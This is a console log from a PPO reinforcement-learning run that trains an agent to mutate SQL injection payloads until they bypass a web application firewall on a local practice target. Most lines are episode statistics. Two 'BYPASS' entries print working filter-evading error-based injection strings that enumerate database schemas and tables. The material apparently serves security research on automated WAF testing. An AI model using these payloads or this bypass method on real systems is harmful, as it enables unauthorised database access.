/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  Ep  890 | SR=0% | Steps=15.0 | R=-44.66
  Ep  900 | SR=0% | Steps=15.0 | R=-44.20
  Ep  910 | SR=0% | Steps=15.0 | R=-45.46
  Ep  920 | SR=0% | Steps=15.0 | R=-42.94
  Ep  930 | SR=0% | Steps=15.0 | R=-44.10
  Ep  940 | SR=0% | Steps=15.0 | R=-43.35
  Ep  950 | SR=0% | Steps=15.0 | R=-45.58
  Ep  960 | SR=0% | Steps=15.0 | R=-45.07
  Ep  970 | SR=0% | Steps=15.0 | R=-44.17
  Ep  980 | SR=0% | Steps=15.0 | R=-43.82
  Ep  990 | SR=0% | Steps=15.0 | R=-44.34
  Ep 1000 | SR=0% | Steps=15.0 | R=-44.76
  Ep 1010 | SR=0% | Steps=15.0 | R=-44.89
  Ep 1020 | SR=0% | Steps=15.0 | R=-45.84
  Ep 1030 | SR=0% | Steps=15.0 | R=-44.18
  Ep 1040 | SR=0% | Steps=15.0 | R=-44.91
  Ep 1050 | SR=0% | Steps=15.0 | R=-43.91
  Ep 1060 | SR=0% | Steps=15.0 | R=-43.51
  Ep 1070 | SR=0% | Steps=15.0 | R=-44.09
  Ep 1080 | SR=0% | Steps=15.0 | R=-44.68
  Ep 1090 | SR=0% | Steps=15.0 | R=-42.67
  Ep 1100 | SR=0% | Steps=15.0 | R=-44.52
  Ep 1110 | SR=0% | Steps=15.0 | R=-44.93
  Ep 1120 | SR=0% | Steps=15.0 | R=-43.99
  Ep 1130 | SR=0% | Steps=15.0 | R=-42.92
  Ep 1140 | SR=0% | Steps=15.0 | R=-44.95
  Ep 1150 | SR=0% | Steps=15.0 | R=-45.07
  Ep 1160 | SR=0% | Steps=15.0 | R=-44.40
  Ep 1170 | SR=0% | Steps=15.0 | R=-43.92
  Ep 1180 | SR=0% | Steps=15.0 | R=-44.01
  Ep 1190 | SR=0% | Steps=15.0 | R=-44.49
  Ep 1200 | SR=0% | Steps=15.0 | R=-43.59
  Ep 1210 | SR=0% | Steps=15.0 | R=-43.73
  Ep 1220 | SR=0% | Steps=15.0 | R=-43.91
  Ep 1230 | SR=0% | Steps=15.0 | R=-42.44
  Ep 1240 | SR=0% | Steps=15.0 | R=-44.27
  Ep 1250 | SR=0% | Steps=15.0 | R=-43.89
  Ep 1260 | SR=0% | Steps=15.0 | R=-43.29
  Ep 1270 | SR=0% | Steps=15.0 | R=-43.49
  Ep 1280 | SR=0% | Steps=15.0 | R=-43.27
  Ep 1290 | SR=0% | Steps=15.0 | R=-41.40
  Ep 1300 | SR=0% | Steps=15.0 | R=-43.94
  Ep 1310 | SR=0% | Steps=15.0 | R=-43.91
  Ep 1320 | SR=0% | Steps=15.0 | R=-44.18
  Ep 1330 | SR=0% | Steps=15.0 | R=-43.98
  Ep 1340 | SR=0% | Steps=15.0 | R=-43.91
  Ep 1350 | SR=0% | Steps=15.0 | R=-44.21
  Ep 1360 | SR=0% | Steps=15.0 | R=-45.00
  Ep 1370 | SR=0% | Steps=15.0 | R=-46.45
  Ep 1380 | SR=0% | Steps=15.0 | R=-44.19
  Ep 1390 | SR=0% | Steps=15.0 | R=-44.59
  Ep 1400 | SR=0% | Steps=15.0 | R=-44.42
  Ep 1410 | SR=0% | Steps=15.0 | R=-43.81
  Ep 1420 | SR=0% | Steps=15.0 | R=-43.56
  Ep 1430 | SR=0% | Steps=15.0 | R=-43.07
  Ep 1440 | SR=0% | Steps=15.0 | R=-43.01
  Ep 1450 | SR=0% | Steps=15.0 | R=-44.78
  Ep 1460 | SR=0% | Steps=15.0 | R=-43.75
  Ep 1470 | SR=0% | Steps=15.0 | R=-43.30
  Ep 1480 | SR=0% | Steps=15.0 | R=-44.51
  Ep 1490 | SR=0% | Steps=15.0 | R=-43.30
  Ep 1500 | SR=0% | Steps=15.0 | R=-43.31
  Ep 1510 | SR=0% | Steps=15.0 | R=-42.32
  Ep 1520 | SR=0% | Steps=15.0 | R=-43.55
  Ep 1530 | SR=0% | Steps=15.0 | R=-42.86
  Ep 1540 | SR=0% | Steps=15.0 | R=-42.54
  Ep 1550 | SR=0% | Steps=15.0 | R=-45.00
  Ep 1560 | SR=0% | Steps=15.0 | R=-44.59
  Ep 1570 | SR=0% | Steps=15.0 | R=-43.65
  Ep 1580 | SR=0% | Steps=15.0 | R=-44.30
  Ep 1590 | SR=0% | Steps=15.0 | R=-44.65
  Ep 1600 | SR=0% | Steps=15.0 | R=-43.20
  Ep 1610 | SR=0% | Steps=15.0 | R=-44.00
  Ep 1620 | SR=0% | Steps=15.0 | R=-42.52
  Ep 1630 | SR=0% | Steps=15.0 | R=-44.01
  Ep 1640 | SR=0% | Steps=15.0 | R=-43.45
  Ep 1650 | SR=0% | Steps=15.0 | R=-42.25
  Ep 1660 | SR=0% | Steps=15.0 | R=-43.49
  Ep 1670 | SR=0% | Steps=15.0 | R=-43.62
  Ep 1680 | SR=0% | Steps=15.0 | R=-41.82
  Ep 1690 | SR=0% | Steps=15.0 | R=-42.04
  Ep 1700 | SR=0% | Steps=15.0 | R=-41.44
  Ep 1710 | SR=0% | Steps=15.0 | R=-41.37
  Ep 1720 | SR=0% | Steps=15.0 | R=-40.33
  Ep 1730 | SR=0% | Steps=15.0 | R=-40.62
  Ep 1740 | SR=0% | Steps=15.0 | R=-40.69
  Ep 1750 | SR=0% | Steps=15.0 | R=-41.67
  Ep 1760 | SR=0% | Steps=15.0 | R=-39.94
  Ep 1770 | SR=0% | Steps=15.0 | R=-40.44
  Ep 1780 | SR=0% | Steps=15.0 | R=-40.02
  Ep 1790 | SR=0% | Steps=15.0 | R=-38.73
  Ep 1800 | SR=0% | Steps=15.0 | R=-38.75
  Ep 1810 | SR=0% | Steps=15.0 | R=-38.89
  Ep 1820 | SR=0% | Steps=15.0 | R=-38.52
  Ep 1830 | SR=0% | Steps=15.0 | R=-39.47
  Ep 1840 | SR=0% | Steps=15.0 | R=-39.82
  Ep 1850 | SR=0% | Steps=15.0 | R=-39.26
  Ep 1860 | SR=0% | Steps=15.0 | R=-39.67
  Ep 1870 | SR=0% | Steps=15.0 | R=-39.47
  Ep 1880 | SR=0% | Steps=15.0 | R=-40.21
  Ep 1890 | SR=0% | Steps=15.0 | R=-39.03
  Ep 1900 | SR=0% | Steps=15.0 | R=-40.05
  Ep 1910 | SR=0% | Steps=15.0 | R=-40.90
  Ep 1920 | SR=0% | Steps=15.0 | R=-41.28
  [BYPASS] Ep 1929 | steps=14 | seq=case -> null_byte -> agg_swap -> func_sp_cmt -> null_byte -> crlf -> case -> case -> case_split -> case -> case -> case -> case -> hex_to_char
           payload: 1'%0d%0aAnd%0d%0aEXP(~(sElecT%0d%0a*%0d%0aFROM%0d%0a(SEleCT%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),taBlE_name))%0d%0afROm%0d%0a
  Ep 1930 | SR=10% | Steps=14.9 | R=-38.54
  Ep 1940 | SR=0% | Steps=15.0 | R=-41.01
  Ep 1950 | SR=0% | Steps=15.0 | R=-38.77
  Ep 1960 | SR=0% | Steps=15.0 | R=-39.37
  Ep 1970 | SR=0% | Steps=15.0 | R=-42.66
  Ep 1980 | SR=0% | Steps=15.0 | R=-37.16
  Ep 1990 | SR=0% | Steps=15.0 | R=-38.26
  Ep 2000 | SR=0% | Steps=15.0 | R=-38.97
  [BYPASS] Ep 2003 | steps=7 | seq=case -> hex_to_char -> crlf -> null_byte -> case -> case -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFrom%0d%0a(selEct%0d%0a((SeLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aINfOrMatiON_ScHEmA.schemata))  *** NEW SHORTEST ***
  Ep 2010 | SR=10% | Steps=14.2 | R=-34.83
  Ep 2020 | SR=0% | Steps=15.0 | R=-38.72
  Ep 2030 | SR=0% | Steps=15.0 | R=-37.53
  Ep 2040 | SR=0% | Steps=15.0 | R=-37.57
  Ep 2050 | SR=0% | Steps=15.0 | R=-37.93
  Ep 2060 | SR=0% | Steps=15.0 | R=-38.79
  Ep 2070 | SR=0% | Steps=15.0 | R=-38.18
  Ep 2080 | SR=0% | Steps=15.0 | R=-39.56
  Ep 2090 | SR=0% | Steps=15.0 | R=-38.39
  Ep 2100 | SR=0% | Steps=15.0 | R=-38.24
  Ep 2110 | SR=0% | Steps=15.0 | R=-37.71
  Ep 2120 | SR=0% | Steps=15.0 | R=-35.49
  Ep 2130 | SR=0% | Steps=15.0 | R=-37.56
  Ep 2140 | SR=0% | Steps=15.0 | R=-37.69
  Ep 2150 | SR=0% | Steps=15.0 | R=-37.44
  Ep 2160 | SR=0% | Steps=15.0 | R=-38.56
  Ep 2170 | SR=0% | Steps=15.0 | R=-37.84
  Ep 2180 | SR=0% | Steps=15.0 | R=-37.92
  Ep 2190 | SR=0% | Steps=15.0 | R=-37.51
  Ep 2200 | SR=0% | Steps=15.0 | R=-38.79
  Ep 2210 | SR=0% | Steps=15.0 | R=-38.16
  Ep 2220 | SR=0% | Steps=15.0 | R=-37.76
  Ep 2230 | SR=0% | Steps=15.0 | R=-38.13
  Ep 2240 | SR=0% | Steps=15.0 | R=-38.71
  Ep 2250 | SR=0% | Steps=15.0 | R=-39.46
  Ep 2260 | SR=0% | Steps=15.0 | R=-38.69
  Ep 2270 | SR=0% | Steps=15.0 | R=-37.86
  Ep 2280 | SR=0% | Steps=15.0 | R=-38.59
  Ep 2290 | SR=0% | Steps=15.0 | R=-39.12
  Ep 2300 | SR=0% | Steps=15.0 | R=-37.89
  Ep 2310 | SR=0% | Steps=15.0 | R=-38.59
  Ep 2320 | SR=0% | Steps=15.0 | R=-39.14
  Ep 2330 | SR=0% | Steps=15.0 | R=-37.74
  Ep 2340 | SR=0% | Steps=15.0 | R=-38.57
  Ep 2350 | SR=0% | Steps=15.0 | R=-37.98
  Ep 2360 | SR=0% | Steps=15.0 | R=-37.65
  Ep 2370 | SR=0% | Steps=15.0 | R=-38.24
  Ep 2380 | SR=0% | Steps=15.0 | R=-38.69
  Ep 2390 | SR=0% | Steps=15.0 | R=-37.62
  Ep 2400 | SR=0% | Steps=15.0 | R=-38.56
  Ep 2410 | SR=0% | Steps=15.0 | R=-39.30
  Ep 2420 | SR=0% | Steps=15.0 | R=-38.73
  Ep 2430 | SR=0% | Steps=15.0 | R=-37.74
